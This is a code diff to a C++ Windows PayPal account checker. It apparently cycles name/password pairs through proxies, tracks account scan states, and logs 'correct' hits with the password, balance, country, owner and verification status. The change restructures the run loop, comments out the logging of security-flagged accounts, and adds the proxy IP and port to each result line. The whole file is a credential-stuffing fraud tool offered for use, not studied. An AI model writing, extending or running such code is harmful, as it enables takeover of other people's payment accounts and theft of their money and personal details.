@@ -17,21 +17,21 @@ PaypalSubTask::~PaypalSubTask(void)
 
 void PaypalSubTask::run()
 {
-	OutputDebugString("PaypalSubTask::run()\n");
-	BOOL ret;
-	OutputDebugString("PaypalSubTask::run() 1\n");
-	ret = step1();
-	if (!ret) 
+	do
 	{
-		OutputDebugString("PaypalSubTask::run() open paypal error http no use\n");
+		OutputDebugString("PaypalSubTask::run()\n");
+		BOOL ret;
+		OutputDebugString("PaypalSubTask::run() 1\n");
+		ret = step1();
+		if (!ret) break;
+		OutputDebugString("PaypalSubTask::run() 2\n");
+		ret = step2();
+		if (!ret) break;
+		OutputDebugString("PaypalSubTask::run() 3\n");
+		ret = step3();
+	} while (false);
+	if (m_account->mState == Account_State_Scanning)
 		gGlobal->getAccount()->updateAccountState(m_account, Account_State_Init);
-		return;
-	}
-	OutputDebugString("PaypalSubTask::run() 2\n");
-	ret = step2();
-	if (!ret) return;
-	OutputDebugString("PaypalSubTask::run() 3\n");
-	ret = step3();
 }
 
 BOOL PaypalSubTask::step1() 
@@ -274,10 +274,10 @@ BOOL PaypalSubTask::step2()
 		} 
 		else if (security)
 		{
-			gGlobal->getAccount()->updateAccountState(m_account, Account_State_Scanned);
+			/*gGlobal->getAccount()->updateAccountState(m_account, Account_State_Scanned);
 			CString s;
 			s.Format("security\t%s\t%s", m_account->mName, m_account->mPassWord);
-			gGlobal->getResult()->addResult(RESULT_SECURITY, s);
+			gGlobal->getResult()->addResult(RESULT_SECURITY, s);*/
 		}
 		else if (unknown) 
 		{
@@ -397,7 +397,7 @@ BOOL PaypalSubTask::step3()
 		InternetCloseHandle(hRequest);
 	}
 	CString s;
-	s.Format("correct\t%s\t%s\t%s\t%s\t%s\t%s", m_account->mName, m_account->mPassWord, m_sMoney, m_sCountry, m_sPerson, m_sVerify);
+	s.Format("correct\t%s\t%s\t%s\t%s\t%s\t%s\t%s\t%d", m_account->mName, m_account->mPassWord, m_sMoney, m_sCountry, m_sPerson, m_sVerify, m_http->mIp, m_http->mPort);
 	gGlobal->getResult()->addResult(RESULT_CORRECT, s);
 	return ret;
 }
